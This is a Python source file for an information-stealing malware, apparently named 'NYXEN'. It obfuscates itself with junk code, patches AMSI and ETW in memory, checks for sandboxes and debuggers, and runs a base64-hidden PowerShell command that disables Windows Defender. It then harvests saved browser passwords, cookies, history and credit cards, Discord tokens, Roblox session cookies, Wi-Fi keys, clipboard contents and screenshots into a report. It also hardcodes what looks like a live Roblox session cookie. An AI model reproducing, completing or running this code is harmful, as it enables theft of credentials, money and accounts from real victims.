import random
import string

def generate_dynamic_junk():
    junk_vars = {}
    for _ in range(random.randint(5, 15)):
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        junk_vars[name] = random.randint(0, 100000)

    def junk_func():
        val = 0
        for v in junk_vars.values():
            val ^= v
        return val

    def opaque_predicate(x):
        return ((x * 123456789 + 987654321) % 2 == 1) or ((x * 123456789 + 987654321) % 2 == 0)

    return junk_vars, junk_func, opaque_predicate

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()


def dynamic_import(name):
    import importlib
    return importlib.import_module(name)

def _import(name):
    return dynamic_import(name)

def _xor_decrypt(data, key):
    base64 = dynamic_import("base64")
    decoded = base64.b64decode(data)
    return ''.join(chr(b ^ key) for b in decoded)

def _disable_amsi_etw():
    _ctypes = _import("ctypes")
    _kernel32 = _ctypes.windll.kernel32

    def _xor(data, key):
        return ''.join(chr(ord(c) ^ key) for c in data)

    def _patch_func(dll_enc, func_enc, key=0x2A):
        try:
            dll_name = _xor(dll_enc, key)
            func_name = _xor(func_enc, key)
            h_module = _kernel32.LoadLibraryA(dll_name.encode("ascii"))
            if not h_module:
                return False
            addr = _kernel32.GetProcAddress(h_module, func_name.encode("ascii"))
            if not addr:
                return False

            size = 6
            old_protect = _ctypes.c_ulong()
            _kernel32.VirtualProtect(addr, size, 0x40, _ctypes.byref(old_protect))
            _ctypes.memmove(addr, b"\xC3" + b"\x90" * (size - 1), size)  # ret + nops
            _kernel32.VirtualProtect(addr, size, old_protect.value, _ctypes.byref(old_protect))
            _kernel32.FlushInstructionCache(_kernel32.GetCurrentProcess(), addr, size)
            return True
        except:
            return False

    patches = [
        (_xor("amsi.dll", 0x2A), _xor("AmsiScanBuffer", 0x2A)),
        (_xor("amsi.dll", 0x2A), _xor("AmsiOpenSession", 0x2A)),
        (_xor("amsi.dll", 0x2A), _xor("AmsiCloseSession", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwEventWrite", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwWrite", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwEventWriteFull", 0x2A))
    ]

    for dll, func in patches:
        _patch_func(dll, func)



def _is_sandbox():
    detected = []
    try:
        os = _import("os")
        platform = _import("platform")
        ctypes = _import("ctypes")
        time = _import("time")
        psutil = dynamic_import("psutil")
    except Exception:
        return False

    def _has_hypervisor_cpuid():
        try:
            class CPUID(ctypes.Structure):
                _fields_ = [("eax", ctypes.c_uint), ("ebx", ctypes.c_uint), ("ecx", ctypes.c_uint), ("edx", ctypes.c_uint)]
            cpuid_fn = ctypes.cdll.LoadLibrary(None).__cpuid
            cpuid_fn.argtypes = (ctypes.POINTER(CPUID), ctypes.c_uint)
            cpuid_fn.restype = None
            regs = CPUID()
            cpuid_fn(ctypes.byref(regs), 1)
            return bool((regs.ecx >> 31) & 1)
        except Exception:
            return False

    def _timing_diff_check(threshold_ns=100000):
        try:
            t1 = time.time_ns()
            t2 = time.time_ns()
            return (t2 - t1) > threshold_ns
        except Exception:
            return False

    VM_PROCESSES = {
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmsrvc", "xenservice",
        "xenstored", "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe"
    }
    VM_FILES = [
        "/usr/bin/vmware-toolbox-cmd", "/usr/bin/VBoxControl", "/dev/vboxguest",
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys"
    ]

    def _scan_processes():
        try:
            names = {p.name().lower() for p in psutil.process_iter()}
            return bool(names & VM_PROCESSES)
        except Exception:
            return False

    def _scan_files():
        try:
            for f in VM_FILES:
                if os.path.exists(f):
                    return True
            return False
        except Exception:
            return False

    VM_MAC_PREFIXES = {
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "52:54:00"
    }

    def _mac_oui_check():
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if hasattr(addr, 'address') and ':' in addr.address:
                        mac = addr.address.upper()[0:8]
                        if mac in VM_MAC_PREFIXES:
                            return True
            return False
        except Exception:
            return False

    def _dmi_bios_check():
        try:
            vendor = ""
            if platform.system() == "Windows":
                wmi = dynamic_import("wmi")
                c = wmi.WMI()
                for bios in c.Win32_BIOS():
                    vendor = bios.Manufacturer.lower()
            else:
                with open("/sys/class/dmi/id/sys_vendor", "r") as f:
                    vendor = f.read().strip().lower()
            return any(x in vendor for x in ("vmware", "virtualbox", "qemu", "xen", "microsoft corporation", "kvm"))
        except Exception:
            return False

    def _windows_registry_check():
        try:
            if platform.system() != "Windows":
                return False
            winreg = dynamic_import("winreg")
            keys = [
                (r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", winreg.KEY_READ),
                (r"SYSTEM\\CurrentControlSet\\Services\\vmhgfs", winreg.KEY_READ),
            ]
            for key, perm in keys:
                try:
                    h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, perm)
                    winreg.CloseKey(h)
                    return True
                except Exception:
                    continue
            return False
        except Exception:
            return False

    ENV_TRAPS = ["VBOX", "VMWARE", "XEN", "HYPERV"]

    def _env_var_check():
        try:
            os = dynamic_import("os")
            for var in os.environ:
                for trap in ENV_TRAPS:
                    if trap in var.upper() or trap in os.environ.get(var, "").upper():
                        return True
            return False
        except Exception:
            return False

    def _is_debugger_present():
        try:
            platform = _import("platform")
            ctypes = _import("ctypes")
            if platform.system() == "Windows":
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            else:
                libc = ctypes.CDLL("libc.so.6")
                PT_TRACE_ME = 0
                return libc.ptrace(PT_TRACE_ME, 0, None, None) != 0
        except Exception:
            return False

    CHECKS = {
        "Hypervisor CPUID bit": _has_hypervisor_cpuid,
        "Timing delta suspicious": _timing_diff_check,
        "Sandbox/VM processes": _scan_processes,
        "Sandbox/VM files": _scan_files,
        "MAC OUI match": _mac_oui_check,
        "BIOS/DMI strings": _dmi_bios_check,
        "Windows registry artifacts": _windows_registry_check,
        "Environment variable traps": _env_var_check,
        "Debugger present": _is_debugger_present,
    }

    for name, fn in CHECKS.items():
        try:
            if fn():
                detected.append(name)
        except Exception:
            continue

    return detected if detected else False


junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _add_noise():
    random = dynamic_import("random")
    return sum(i*i for i in range(random.randint(10, 50)))

def _get_ip():
    try:
        requests = dynamic_import("requests")
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def _get_clipboard():
    try:
        subprocess = _import("subprocess")
        p = subprocess.run(["powershell", "-command", "Get-Clipboard"], capture_output=True, text=True)
        return p.stdout.strip() or "Clipboard empty"
    except:
        return "Clipboard access failed"

def _get_process_list():
    try:
        psutil = dynamic_import("psutil")
        procs = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                procs.append(f"{proc.info['pid']:>6} : {proc.info['name']}")
            except:
                pass
        return "\n".join(procs)
    except:
        return "Failed to get process list"

def _random_temp_filename(base):
    random = dynamic_import("random")
    string = dynamic_import("string")
    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"{base}_{rand}.tmp"

def _save_to_temp(filename, data):
    try:
        os = _import("os")
        tempfile = _import("tempfile")
        path = os.path.join(tempfile.gettempdir(), _random_temp_filename(filename))
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)
        return path
    except:
        return None

def _getSecretKey():
    base64 = dynamic_import("base64")
    try:
        win32crypt = dynamic_import("win32crypt")
        os = dynamic_import("os")
        json = dynamic_import("json")
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def _generateCipher(aes_key, iv):
    Crypto = dynamic_import("Crypto.Cipher")
    from Crypto.Cipher import AES
    return AES.new(aes_key, AES.MODE_GCM, iv)

def _decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = _generateCipher(secret_key, initialisation_vector)
        decrypted_pass = _decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return None
    
junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _grab_wifi_passwords():
    try:
        subprocess = _import("subprocess")
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, text=True)
        wifi_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
        result = []
        for name in wifi_names:
            try:
                key_out = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, text=True, errors='ignore')
                key = "None"
                for line in key_out.split('\n'):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        break
                result.append(f"{name} : {key}")
            except Exception:
                result.append(f"{name} : Failed to get key")
        return "\n".join(result)
    except Exception as e:
        return f"WiFi grab failed: {e}"

import os, datetime
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    random = dynamic_import("random")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
    ]
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents)
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    re = dynamic_import("re")
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    json = dynamic_import("json")
    try:
        with open(path + f"\\Local State", "r", encoding="utf-8") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
    except FileNotFoundError:
        return None
    return key

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def getDiscordInfo():
    json = dynamic_import("json")
    base64 = dynamic_import("base64")
    urllib = dynamic_import("urllib")
    from Crypto.Cipher import AES
    Crypto = dynamic_import("Crypto.Cipher")
    import win32crypt
    win32crypt = dynamic_import("win32crypt")
    platform = dynamic_import("platform")
    checked = []
    all_discord_info = []

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                secret_key = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
                aes_token = token.split('dQw4w9WgXcQ:')[1]
                iv = base64.b64decode(aes_token)[3:15]
                encrypted = base64.b64decode(aes_token)[15:]
                cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                token_dec = cipher.decrypt(encrypted)[:-16].decode()
                if token_dec in checked:
                    continue
                checked.append(token_dec)

                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token_dec))
                res = urllib.request.urlopen(req)
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                discord_info = f"""
**New user data: {res_json['username']}**
```yaml
User ID: {res_json['id']}
Email: {res_json['email']}
Phone Number: {res_json['phone']}
MFA Enabled: {res_json['mfa_enabled']}
Locale: {res_json['locale']}
Verified: {res_json['verified']}
Token:
{token_dec}
```
"""
                all_discord_info.append(discord_info)
            except Exception:
                    continue
            
        return "\n\n".join(all_discord_info) if all_discord_info else "No Discord tokens found."
    

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _get_wmic_info(query):
    subprocess = dynamic_import("subprocess")
    try:
        result = subprocess.run(["wmic"] + query.split(), capture_output=True, text=True)
    except FileNotFoundError:
        return "wmic command not found"
    lines = result.stdout.strip().split("\n")
    junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
    val = junk_func()
    flag = opaque_predicate(random.randint(0, 1000000))
    return lines[1].strip() if len(lines) > 1 else None

def hwidInfo():
    mb_serial = _get_wmic_info("baseboard get SerialNumber")
    return mb_serial
    

def _get_geo_ip():
    try:
        requests = dynamic_import("requests")
        r = requests.get("https://ipapi.co/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            loc = f"{data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country_name', 'N/A')}"
            return loc
    except Exception:
        pass
    return "Unknown"

def _get_pc_language():
    try:
        locale = dynamic_import("locale")
        locale.setlocale(locale.LC_ALL, '') 
        lang = locale.getlocale()  
        return lang[0] if lang and lang[0] else "Unknown"
    except Exception:
        return "Unknown"

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _get_timezone():
    try:
        time = dynamic_import("time")
        tz = time.tzname[time.daylight] if time.daylight else time.tzname[0]
        return tz
    except Exception:
        return "Unknown"
    
def _get_screen_resolution():
    try:
        ctypes = dynamic_import("ctypes")
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        return f"{width}x{height}"
    except Exception:
        return "Unknown"

    
def _take_screenshot():
    try:
        from PIL import ImageGrab
        tempfile = dynamic_import("tempfile")
        os = dynamic_import("os")

        img = ImageGrab.grab()
        tmp_dir = tempfile.gettempdir()
        filename = os.path.join(tmp_dir, "screenshot.png")
        img.save(filename, "PNG")
        return filename
    except Exception:
        return None
    

def _retrieve_roblox_cookies():
    shutil = dynamic_import("shutil")
    win32crypt = dynamic_import("win32crypt")
    json = dynamic_import("json")
    base64 = dynamic_import("base64")
    re = dynamic_import("re")
    os = dynamic_import("os")

    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return "Roblox cookies file not found"

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            if not encoded_cookies:
                return "Error: No 'CookiesData' found in the file."

            decoded_cookies = base64.b64decode(encoded_cookies)
            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
            decoded_str = decrypted_cookies.decode('utf-8', errors='ignore')

            match = re.search(r'(_\|WARNING:[^;]*);', decoded_str)
            if match:
                warning_str = match.group(1).strip()
                return warning_str
            else:
                return "'_|WARNING:' string not found"

        except json.JSONDecodeError as e:
            return f"Error while parsing JSON: {e}"
        except Exception as e:
            return f"Error decrypting cookies: {e}"

        

import subprocess, base64

def _disable_defender():
    parts = [
        "cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5j",
        "ZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25Te",
        "XN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdG",
        "lvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRv",
        "cmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW",
        "5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVy",
        "QWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUH",
        "JvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBT",
        "UmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbG",
        "VzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVs",
        "bCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbG",
        "VzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlu",
        "cHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub2",
        "5lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRk",
        "LU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVV",
        "NFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVs",
        "bC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dG",
        "Zvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29t",
        "bWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW",
        "9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBv",
        "d2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcm",
        "VmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5l",
        "eGUnIiAK"
    ]
    cmd = base64.b64decode("".join(parts)).decode()
    subprocess.run(cmd, shell=True, capture_output=True)


def _get_master_key(path):
    json = dynamic_import("json")
    base64 = dynamic_import("base64")
    from win32crypt import CryptUnprotectData

    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def _decrypt_browser_data(buff, master_key):
    Crypto = dynamic_import("Crypto.Cipher")
    #AES = Crypto.AES
    from Crypto.Cipher import AES
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return ""

def _extract_browser_passwords(browser_name, user_path, profile, master_key):
    os = dynamic_import("os")
    sqlite3 = dynamic_import("sqlite3")
    login_path = os.path.join(user_path, profile, "Login Data") if 'opera' not in browser_name else user_path + '\\Login Data'
    if not os.path.isfile(login_path): return []

    conn = sqlite3.connect(login_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for url, user, pwd in cursor.fetchall():
        if url and user and pwd:
            password = _decrypt_browser_data(pwd, master_key)
            results.append((url, user, password))

    cursor.close()
    conn.close()
    return results

def _extract_browser_cookies(browser_name, user_path, profile, master_key):
    from shutil import copy2
    tempfile = dynamic_import("tempfile")
    sqlite3 = dynamic_import("sqlite3")
    os = dynamic_import("os")

    cookie_path = os.path.join(user_path, profile, "Network", "Cookies") if 'opera' not in browser_name else user_path + '\\Network\\Cookies'
    if not os.path.isfile(cookie_path): return []

    temp_cookie = tempfile.mktemp()
    copy2(cookie_path, temp_cookie)
    conn = sqlite3.connect(temp_cookie)
    cursor = conn.cursor()
    
    cookies = []
    try:
        for host, name, path, enc_val, exp in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
            val = _decrypt_browser_data(enc_val, master_key)
            if host and name and val:
                cookies.append((host, name, path, val, exp))
    except:
        pass

    cursor.close()
    conn.close()
    os.remove(temp_cookie)
    return cookies

def _extract_browser_history(browser_name, user_path, profile):
    os = dynamic_import("os")
    sqlite3 = dynamic_import("sqlite3")
    history_path = os.path.join(user_path, profile, "History") if 'opera' not in browser_name else user_path + '\\History'
    if not os.path.isfile(history_path): return []

    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    try:
        history = [(url, visits) for url, visits in cursor.execute("SELECT url, visit_count FROM urls").fetchall()]
    except:
        history = []

    cursor.close()
    conn.close()
    return history

junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
val = junk_func()
flag = opaque_predicate(random.randint(0, 1000000))

def _extract_browser_credit_cards(browser_name, user_path, profile, master_key):
    os = dynamic_import("os")
    sqlite3 = dynamic_import("sqlite3")
    path = os.path.join(user_path, profile, "Web Data") if 'opera' not in browser_name else user_path + '\\Web Data'
    if not os.path.isfile(path): return []

    conn = sqlite3.connect(path)
    cursor = conn.cursor()
    cards = []

    try:
        for name_on_card, month, year, enc_num in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
            number = _decrypt_browser_data(enc_num, master_key)
            cards.append((name_on_card, month, year, number))
    except:
        pass

    cursor.close()
    conn.close()
    return cards

def _save_passwords_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "passwords.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Website  |  Username  |  Password\n\n")
        for url, user, pwd in data:  
            f.write(f"{url}  |  {user}  |  {pwd}\n")
    return path

def _save_cookies_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "cookies.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Host  |  Name  |  Path  |  Value  |  Expires\n\n")
        for host, name, path_, val, expires in data:  #
            f.write(f"{host}  |  {name}  |  {path_}  |  {val}  |  {expires}\n")
    return path

def _save_history_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "history.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Url  |  Visit Count\n\n")
        for url, visits in data:  
            f.write(f"{url}  |  {visits}\n")
    return path

def _save_cards_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "credit_cards.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n")
        for name_on_card, month, year, number in data:  
            f.write(f"{name_on_card}  |  {month}  |  {year}  |  {number}\n")
    return path

def _run_browser_data_extraction():
    os = dynamic_import("os")
    psutil = dynamic_import("psutil")
    threading = dynamic_import("threading")

    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp_dir = os.path.join(os.getenv('TEMP'), "BrowserData")
    os.makedirs(temp_dir, exist_ok=True)

    browsers = {
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
        'opera': roaming + '\\Opera Software\\Opera Stable',
        'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
    }

    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

    raw_results = {'passwords': [], 'cookies': [], 'history': [], 'credit_cards': []}

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [
                "chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"
            ]:
                proc.kill()
        except:
            pass

    def process_profile(browser_name, base_path, profile):
        master_key = _get_master_key(os.path.join(base_path, "Local State"))
        if not master_key:
            return

        raw_results['passwords'] += _extract_browser_passwords(browser_name, base_path, profile, master_key)
        raw_results['cookies'] += _extract_browser_cookies(browser_name, base_path, profile, master_key)
        raw_results['history'] += _extract_browser_history(browser_name, base_path, profile)
        raw_results['credit_cards'] += _extract_browser_credit_cards(browser_name, base_path, profile, master_key)

    threads = []
    for browser_name, base_path in browsers.items():
        if not os.path.isdir(base_path):
            continue
        for profile in profiles:
            t = threading.Thread(target=process_profile, args=(browser_name, base_path, profile))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    saved_files = {
        "passwords": _save_passwords_to_file(raw_results['passwords'], temp_dir),
        "cookies": _save_cookies_to_file(raw_results['cookies'], temp_dir),
        "history": _save_history_to_file(raw_results['history'], temp_dir),
        "credit_cards": _save_cards_to_file(raw_results['credit_cards'], temp_dir),
    }

    return saved_files

def robloxinfo():
    junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
    val = junk_func()
    flag = opaque_predicate(random.randint(0, 1000000))


    requests = dynamic_import("requests")

    robo_cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.6BDF1F3FA06456310126CFB683315C966BCBADADAD643DD176422719EA67A40FCCBCE2CD06C96A401CB7B2C7CFA1200291C1885A94D70B226C59AE169C409A48E004764E47BAB6BF66DD8CA04D841BC6625ABD3E334B67B43BE78AAB8AABF4C56BC0359957ADD4CE03B7DCDC860E33EB91DEC400273BBD83CBD97149019B0BB613E0396B7F5F81F2E4146356D760BAE1A0C79BDF2CCFD1DBB87EB108E2D710B0F842768BA821923D1E705D06FE7D425282E6235C9D8A844C26731DF4EB2809ABFA70C7E29819ACBD156D8D6B81A3023C92717CF22EE6F489AC7354914B071E0331BA05D10AA6629C3EE8CBC4F3E5E20F8DE3DAC5EC3145FC2D8655DA77E389230E808C22A818F31E7D0305BD0B58A8BB6ECB9025CCFD8BDC8293E9C8032F96907C64483E61F47652C513DD79C11A889380A04F79810ECD9738FF9A684D35EBA8EE040C094111CBC5B5C2B27B8CBFA199E116DD51BF0FB4D710D553E1963F44B1F325B00FCB7A195FC87242390666C43D26B9EC0CBCDB2F5ED31EFAF34F96C913830AF1F0ACDE480BE964993E735CCEE8C3527A9013343EB95D45654836F4B218AB1DAB167324FBDD19211BDBD36D753522275ECB5A05D2D6E69D9981045B0546D6B91F89DA48B2EA75E05D7E687E15D19FF46E8C44EE08920533799C6A1C2D1BACF04FD9992D123C7D7404B1338F0563DBBCC11E53B74485AB34323356D24EDD3A0A5DE32A51E40A5B84821077B3D7D13340EFB7072DF82A8CD19C1B47D0A4158FEAEF79F198A2568723A5D5BB6AA22D6816E672F477991CBA27DDECCE700BBE78CB7AC1FACBA838120F90F46FC3DFDE4333B0D9"

    if robo_cookie == "No Roblox Cookies Found":
        return None

    try:
        response = requests.get(
            "https://users.roblox.com/v1/users/authenticated",
            cookies={".ROBLOSECURITY": robo_cookie},
            timeout=10
        )
        response.raise_for_status()
        info = response.json()


        message = f"""
    Username: {info['name']}\n
    Display Name: {info['displayName']}\n
    ID: {info['id']}\n
    """

        return message
    except requests.exceptions.HTTPError as e:
        return None
    except requests.exceptions.RequestException as e:
        return None





def safe_str(s, max_len=500):
    if not s:
        return "N/A"
    s = str(s)
    if len(s) > max_len:
        return s[:max_len] + "..."
    return s

def _build_report():
    platform = dynamic_import("platform")
    getpass = dynamic_import("getpass")
    user = getpass.getuser()
    ip = safe_str(_get_ip())
    sysinfo = safe_str(platform.platform())
    clipboard = safe_str(_get_clipboard())
    wifi = safe_str(_grab_wifi_passwords(), max_len=1000)
    hwid_infO = safe_str(hwidInfo())
    geo = _get_geo_ip()
    lang = _get_pc_language()
    tz = _get_timezone()
    Screen_res = _get_screen_resolution()

    return f"""
🧠 NYXEN REPORT
--------------------
🧍 User: {user}
🌐 IP: {ip}
📍  Geolocation: {geo}
🗣 Language: {lang}
⏰ Timezone: {tz}
💻 OS: {sysinfo}
